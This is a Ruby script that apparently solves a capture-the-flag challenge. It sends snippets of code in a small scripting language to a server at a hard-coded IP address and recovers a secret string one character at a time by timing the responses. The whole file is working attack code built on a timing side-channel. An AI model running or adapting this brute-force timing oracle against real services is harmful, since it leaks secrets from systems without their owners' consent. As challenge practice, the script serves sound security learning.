require 'net/http'
require 'uri'
require 'json'

CHARS = [*'A'..'Z', *'0'..'9', '_']
done = false

flag = ""
i = ARGV.size > 0 ? ARGV[0].to_i : 0
until done
  CHARS.each do |c|
    code = <<~END
      if charAt(DEV_NULL, #{i}) == "#{c}" then
        if length(DEV_NULL) == #{i} + 1 then
          pause(5000)
        else
          pause(2000)
        end
      end
    END
    start = Time.now
    Net::HTTP.post(
      URI('http://35.207.132.47/wee/dev/null'),
      { code: code }.to_json
    )
    elapsed = Time.now - start

    if elapsed > 2
      done = true if elapsed > 5
      flag << c
      break
    end

    if c == '_'
      puts "Didn't find a hit for char ##{i}"
      flag << " "
    end
  end
  puts flag
  i += 1
end

puts "Flag: #{flag}"
